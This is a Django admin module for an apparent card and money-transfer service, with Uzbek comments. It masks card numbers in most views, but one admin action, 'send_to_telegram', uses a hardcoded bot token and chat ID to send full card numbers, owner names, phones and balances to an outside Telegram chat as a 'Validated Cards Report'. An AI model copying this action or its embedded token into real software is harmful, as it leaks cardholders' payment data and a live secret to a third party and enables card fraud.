from django.contrib import admin, messages
from django.shortcuts import render, redirect
from django.utils.html import format_html
from django.utils import timezone
from django.contrib.humanize.templatetags.humanize import intcomma

from .models import Card, User, OTP, Transfer, Error
from .services import import_cards
from .utils import card_mask, phone_mask, send_telegram_message

@admin.register(Card)
class CardAdmin(admin.ModelAdmin):
    list_display = [
        'formatted_card', 'owner', 'formatted_phone', 
        'is_sms_enabled', 'status', 'formatted_balance', 
        'display_blocked_until', 'check_block_status'
    ]
    list_filter = ['status', 'expire', 'is_sms_enabled', 'created_at']

    # MUHIM: Funksiya nomi ham, baza maydoni ham readonly bo'lishi kerak
    readonly_fields = ('owner', 'card_number', 'formatted_card', 'expire', 'balance')

    fieldsets = (
        ("Asosiy ma'lumotlar", {
            'fields': ('status', 'is_sms_enabled', 'blocked_until')
        }),
        ("Faqat o'qish uchun", {
            # Bu yerda 'formatted_card'ni ishlatsangiz, u chiroyli (yulduzchali) ko'rinadi
            # 'card_number'ni ishlatsangiz, original raqam ko'rinadi (lekin baribir readonly bo'ladi)
            'fields': ('owner', 'formatted_card', 'expire', 'balance'),
            'description': "Bu ma'lumotlarni o'zgartirib bo'lmaydi."
        }),
    )
    # QIDIRUV: Endi owner orqali phone_number va ism-familiya bo'yicha qidiradi
    search_fields = [ 'owner__phone_number', 'owner__first_name', 'owner__last_name']
    
    change_list_template = "admin/cards/card_change_list.html"
    actions = ['make_active', 'make_inactive', 'send_to_telegram', 'enable_sms', 'disable_sms']

    # --- ACTIONLAR ---

    @admin.action(description="Tanlangan kartalarda SMSni yoqish")
    def enable_sms(self, request, queryset):
        updated = queryset.update(is_sms_enabled=True)
        self.message_user(request, f"{updated} ta kartada SMS xizmati yoqildi.")

    @admin.action(description="Tanlangan kartalarda SMSni o'chirish")
    def disable_sms(self, request, queryset):
        updated = queryset.update(is_sms_enabled=False)
        self.message_user(request, f"{updated} ta kartada SMS xizmati o'chirildi.")

    @admin.action(description="Tanlangan kartalarni aktivlashtirish")
    def make_active(self, request, queryset):
        updated = queryset.update(status='active')
        self.message_user(request, f"{updated} ta karta muvaffaqiyatli aktivlashtirildi.")

    @admin.action(description="Tanlangan kartalarni nofaol qilish")
    def make_inactive(self, request, queryset):
        updated = queryset.update(status='inactive')
        self.message_user(request, f"{updated} ta karta holati 'Noaktiv'ga o'zgartirildi.")

    @admin.action(description="Tasdiqlangan kartalarni Telegramga yuborish")
    def send_to_telegram(self, request, queryset):
        TOKEN = "8448513005:AAFCmG5C9a2_3Tbh_bDzoXThUfotsTUlx0E"
        CHAT_ID = 1078739901
        
        sent_count = 0
        skipped_html = "" 
        header = "<b>🚀 Validated Cards Report</b>\n\n"
        message = header

        for card in queryset:
            # Telefon raqamini owner'dan olamiz
            user_phone = card.owner.phone_number if card.owner else None
            
            if not user_phone:
                skipped_html += f"{card.card_number} (Foydalanuvchi biriktirilmagan)<br>"
                continue
            
            balance_str = f"{intcomma(card.balance)} UZS"
            card_info = (
                f"💳 Card: <code>{card.card_number}</code>\n"
                f"👤 Owner: <b>{card.owner.get_full_name()}</b>\n"
                f"📞 Phone: <code>{user_phone}</code>\n"
                f"💰 Balance: <b>{balance_str}</b>\n"
                f"-------------------\n\n"
            )

            if len(message) + len(card_info) > 4000:
                send_telegram_message(CHAT_ID, TOKEN, message)
                message = header
            
            message += card_info
            sent_count += 1

        if sent_count > 0:
            send_telegram_message(CHAT_ID, TOKEN, message)
            self.message_user(request, f"{sent_count} ta karta Telegramga yuborildi.")

        if skipped_html:
            self.message_user(request, format_html("<b>Yuborilmadi (Raqam yo'q):</b><br>{}", format_html(skipped_html)), messages.ERROR)

    # --- FORMATLASH FUNKSIYALARI ---

    def formatted_card(self, obj): 
        return card_mask(obj.card_number)
    formatted_card.short_description = "Karta raqami"

    def formatted_phone(self, obj): 
        if obj.owner and obj.owner.phone_number:
            return phone_mask(obj.owner.phone_number)
        return format_html('<span style="color: gray;">Bog\'lanmagan</span>')
    formatted_phone.short_description = "Telefon"

    def formatted_balance(self, obj):
        return format_html("<b>{}</b> UZS", intcomma(obj.balance))
    formatted_balance.short_description = "Balans"

    def display_blocked_until(self, obj):
        if obj.blocked_until and obj.blocked_until > timezone.now():
            return obj.blocked_until.strftime("%Y-%m-%d %H:%M")
        return "-"
    display_blocked_until.short_description = "Bloklangan vaqti"

    def check_block_status(self, obj):
        if obj.blocked_until and timezone.now() < obj.blocked_until:
            return format_html('<span style="color: red; font-weight: bold;">🔴 Blokda</span>')
        return format_html('<span style="color: green;">🟢 Ochiq</span>')
    check_block_status.short_description = 'Status'

    # --- EXCEL IMPORT ---

    def get_urls(self):
        from django.urls import path
        return [path('import-excel/', self.import_excel, name='import_excel')] + super().get_urls()

    def import_excel(self, request):
        if request.method == "POST":
            excel_file = request.FILES.get('excel_file')
            if not excel_file:
                messages.error(request, "Iltimos, faylni tanlang.")
                return redirect(".")

            success, errors = import_cards(excel_file)
            if success > 0:
                messages.success(request, f"{success} ta karta muvaffaqiyatli saqlandi.")
            if errors:
                for error in errors[:10]:
                    messages.error(request, error)
            return redirect("..")
        return render(request, "admin/cards/import_excel.html")

# --- BOSHQA MODELLAR ---





@admin.register(User)
class UserAdmin(admin.ModelAdmin):
    list_display = ['username', 'first_name', 'last_name', 'phone_number', 'blocked_until']
    search_fields = ['username', 'phone_number', 'first_name', 'last_name', 'get_cards']
    readonly_fields = ['first_name', 'last_name', 'phone_number', 'get_cards']

    def get_cards(self, obj):
        # Related name orqali kartalarni olamiz
        cards = obj.cards.all() 
        if not cards.exists():
            return "Karta yo'q"
        
        # Kartalarni chiroyli qator ko'rinishida qaytaramiz
        return ", ".join([str(card.card_number) for card in cards])

    get_cards.short_description = 'Kartalari'



    def get_queryset(self, request):
        # Asosiy querysetni olamiz
        qs = super().get_queryset(request)
        
        # Agar joriy foydalanuvchi superuser bo'lsa ham, 
        # ro'yxatdan barcha superuserlarni filtrlab (olib tashlab) ko'rsatamiz
        return qs.filter(is_superuser=False)

@admin.register(OTP)
class OTPAdmin(admin.ModelAdmin):
    list_display = ['user', 'purpose', 'expires_at', 'try_count', 'is_used', 'created_at', "short_hash"]
    list_filter = ['purpose', 'is_used']

    def short_hash(self, obj):
        if obj.otp_hash:
            # Faqat boshidagi 10 ta belgini ko'rsatadi
            return f"{obj.otp_hash[:10]}..."
        return "-"
    
    short_hash.short_description = 'OTP Hash'


    def masked_code(self, obj):
        return "****"  # Admin kodni umuman ko'ra olmasligi xavfsizroq
    
    masked_code.short_description = 'Code'

@admin.register(Transfer)
class TransferAdmin(admin.ModelAdmin):
    # Model maydonlari o'rniga biz yaratgan formatlash funksiyalarini qo'yamiz
    list_display = [
        'masked_ext_id', 'masked_sender', 'masked_receiver', 
        'sending_amount_display', 'currency', 'state', 'created_at' # <--- O'zgartirildi
    ]
    list_filter = ['state', 'currency', 'created_at']
    
    # Qidiruv hali ham asl raqamlar bo'yicha ishlashi kerak (admin topa olishi uchun)
    search_fields = ['ext_id', 'sender_card_number', 'receiver_card_number']
    
    # Ma'lumotlarni o'zgartirib bo'lmasligi uchun (Read-only)
    readonly_fields = ['ext_id', 'sender_card_number', 'receiver_card_number', 'sending_amount', 'currency', 'state', 'created_at']

    # --- MASKALASH FUNKSIYALARI ---

    def masked_ext_id(self, obj):
        # Tashqi IDning faqat boshini va oxirini ko'rsatamiz: "EXT-12...89"
        if obj.ext_id:
            return f"{obj.ext_id[:6]}****{obj.ext_id[-4:]}"
        return "-"
    masked_ext_id.short_description = "External ID"

    def masked_sender(self, obj):
        # Yuboruvchi karta: "8600 **** **** 1234"
        return card_mask(obj.sender_card_number)
    masked_sender.short_description = "Yuboruvchi"

    def masked_receiver(self, obj):
        # Qabul qiluvchi karta: "9860 **** **** 5678"
        return card_mask(obj.receiver_card_number)
    masked_receiver.short_description = "Qabul qiluvchi"

    # Summa o'z holicha qoladi (siz aytgandek)
    def sending_amount_display(self, obj):
        return format_html("<b>{}</b>", intcomma(obj.sending_amount))
    sending_amount_display.short_description = "Summa"

